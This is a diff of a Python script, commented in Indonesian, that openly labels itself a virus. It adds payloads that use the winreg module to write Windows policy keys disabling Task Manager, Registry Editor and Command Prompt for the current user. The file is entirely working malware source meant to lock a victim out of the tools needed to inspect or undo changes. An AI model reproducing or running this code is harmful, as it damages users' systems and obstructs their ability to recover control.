@@ -7,12 +7,14 @@
 import winreg as reg
 
 # membuat fungsi atau function untuk membuat virus yang diberi nama buat_virus
-def buat_virus(root_key, key_path, key_name, value_type ,value ):
+def create_virus(root_key, key_path, key_name, value_type ,value ):
     key = reg.CreateKey(root_key, key_path)
     reg.SetValueEx(key, key_name, 0, value_type, value)
     reg.CloseKey(key)
 
 # membuat objek dari fungsi buat_virus yang sudah dibuat diatas
+# 1. Mendisable Taskmanager
+# Ahmad Zaeni Imron
 virus1 = {
     'root_key': reg.HKEY_CURRENT_USER,
     'key_path': 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
@@ -22,4 +24,30 @@ virus1 = {
 }
 
 # menjalankan fungsi buat_virus dan memecah setiap key yang ada di object virus1 untuk dijadikan parameter di fungsi buat_virus
-buat_virus(**virus1)
+create_virus(**virus1)
+
+# virus2
+# 2. Mendisable Registry Editor
+# Ahmad Zaeni Imron
+virus2 = {
+    'root_key': reg.HKEY_CURRENT_USER,
+    'key_path': 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
+    'key_name': 'DisableRegistryTools',
+    'value_type': reg.REG_DWORD,
+    'value': 1
+}
+
+create_virus(**virus2)
+
+#virus3
+# 3. Mendisable Command Prompt
+# Ahmad Zaeni Imron
+virus3 = {
+    'root_key': reg.HKEY_CURRENT_USER,
+    'key_path': 'SOFTWARE\\Policies\\Microsoft\\Windows\\System',
+    'key_name': 'DisableCMD',
+    'value_type': reg.REG_DWORD,
+    'value': 2
+}
+
+create_virus(**virus3)
